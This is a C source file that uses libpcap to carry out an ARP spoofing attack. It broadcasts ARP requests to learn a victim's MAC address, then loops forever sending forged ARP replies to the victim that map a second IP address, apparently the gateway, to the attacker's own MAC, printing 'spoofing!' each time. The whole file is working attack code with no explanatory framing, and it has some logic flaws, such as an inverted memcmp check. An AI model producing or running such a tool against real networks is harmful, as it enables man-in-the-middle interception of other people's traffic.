#include <pcap/pcap.h> 
#include <netinet/in.h> 
#include <netinet/if_ether.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>


#define ARP_PACKET_SIZE 60

int getLocalAddrInfo(char *ip_buf, char *mac_buf);
void str2hexMac(char *string_mac, uint8_t *hex_mac);
void str2hexIp(char *string_ip, uint8_t *hex_ip);
void sendArpPacket(pcap_t *p, char * src_mac, char * dst_mac, char *src_ip, char * dst_ip, u_short option);

int main(int argc, char * argv[])
{
	pcap_t *handle;	 
	char *dev;
	char errbuf[PCAP_ERRBUF_SIZE];
	struct pcap_pkthdr *header;
	const u_char *packet;

	struct in_addr local_addr;
	
	if(argc != 4){
		printf("wrong input\n");
		exit(1);
	}

	handle = pcap_open_live(argv[1], BUFSIZ, 1, 1000, errbuf);
	if (handle == NULL) {
		printf("pcap_open_error\n");
		exit(1);
	}

	uint8_t local_ip_strbuf[16] = {0};
	uint8_t local_mac_strbuf[18] = {0};	
	if(!getLocalAddrInfo(local_ip_strbuf, local_mac_strbuf))
	{
		printf("get local ERROR\n");
		exit(1);	
	}

	printf("get local!\n");
	struct ether_header * ether_packet;
	struct ether_arp *arp_packet;

	int check;
	while(1) {
		sendArpPacket(handle, local_mac_strbuf, "00:00:00:00:00:00", local_ip_strbuf, argv[2], 1); 
		printf("broadcast arp request\n");
		check = pcap_next_ex(handle, &header, &packet);
		if(check == 0)
			continue;
		else if(check == -1)
		{
			printf(" pcap next error\n");
			exit(1);
		}

		ether_packet = packet;

		if(ntohs(ether_packet->ether_type) == 0x0806)
		{
		arp_packet = packet + sizeof(struct ether_header);
		uint8_t buf[4] = {0};
		str2hexIp(argv[2], buf);
		if(memcmp(arp_packet->arp_spa, buf, 4) && ntohs(arp_packet->ea_hdr.ar_op) == 2)
			break;
		}
	}

	char victim_mac[18] = {0};

	sprintf(victim_mac, "%0x:%0x:%0x:%0x:%0x:%0x", arp_packet->arp_sha[0]	, arp_packet->arp_sha[1], arp_packet->arp_sha[2], arp_packet->arp_sha[3], arp_packet->arp_sha[4], arp_packet->arp_sha[5]);

	while(1)
	{
		sendArpPacket(handle, local_mac_strbuf, victim_mac, argv[3], argv[2], 2);
		printf("spoofing!");
		sleep(3);
	}
	return 0;
}

int getLocalAddrInfo(char *ip_buf, char *mac_buf) 
{//like..python...
	FILE * fp;
	fp = popen("ifconfig enp0s3 | grep 'inet ' | awk '{print $2}'", "r");
	if(fp == NULL)
	{
		printf("FILE OPEN ERROR IN getlocal_addrInfo (get ip addr)\n");
		exit(1);
	}
	if(fgets(ip_buf, 16, fp) == NULL)
		return 0;	
	pclose(fp);
	fp = popen("ifconfig enp0s3 | grep 'ether' | awk '{print $2}'", "r");
	if(fp == NULL)
	{
		printf("FILE OPEN ERROR IN getlocal_addrInfo (get mac addr)\n");
		exit(1);
	}
	if(fgets(mac_buf, 18, fp) == NULL)
		return 0;	
	pclose(fp);
	printf("local IP : %s", ip_buf);
	printf("local MAC : %s\n", mac_buf);
	return 1;	
}

void str2hexMac(char *string_mac, uint8_t *hex_mac)
{
	sscanf(string_mac, "%x:%x:%x:%x:%x:%x", hex_mac, hex_mac + 1 , hex_mac + 2, hex_mac + 3, hex_mac + 4, hex_mac + 5);
}

void str2hexIp(char *string_ip, uint8_t *hex_ip)
{
	sscanf(string_ip, "%d.%d.%d.%d", hex_ip, hex_ip + 1 ,hex_ip + 2, hex_ip + 3);
}

void sendArpPacket(pcap_t *p, char *src_mac_buf, char *dst_mac_buf, char *src_ip_buf, char *dst_ip_buf, u_short option)
{
	struct ether_header* p_eth;
	struct ether_arp* p_arp;

	u_char buf[ARP_PACKET_SIZE] = {0}; 
	p_eth = (struct ether_header *)buf;
	p_arp = (struct ether_arp *)(buf + sizeof(struct ether_header));

	p_arp->ea_hdr.ar_hrd = htons(1); 
	p_arp->ea_hdr.ar_pro = htons(0x0800); 
	p_arp->ea_hdr.ar_hln = 6; 
	p_arp->ea_hdr.ar_pln = 4;
	p_arp->ea_hdr.ar_op = htons(option);

	uint8_t src_mac[6];
	str2hexMac(src_mac_buf, src_mac); 

	uint8_t dst_mac[6];
	if(option == 1)
		str2hexMac("FF:FF:FF:FF:FF:FF", dst_mac);		
	else
		str2hexMac(dst_mac_buf, dst_mac);

	uint8_t src_ip[4];
	str2hexIp(src_ip_buf, src_ip);

	uint8_t dst_ip[4];
	str2hexIp(dst_ip_buf, dst_ip);

	memcpy(p_arp->arp_sha, src_mac, 6);
	memcpy(p_arp->arp_spa, src_ip, 4);
	memcpy(p_arp->arp_tha, dst_mac, 6);
	memcpy(p_arp->arp_tpa, dst_ip, 4);

	memcpy(p_eth->ether_dhost, dst_mac, 6);
	memcpy(p_eth->ether_shost, src_mac, 6);
	p_eth->ether_type = htons(0x0806);

	if(pcap_sendpacket(p, buf, ARP_PACKET_SIZE) == -1)
	{
		printf("Error\n");
		exit(1);
	}
}
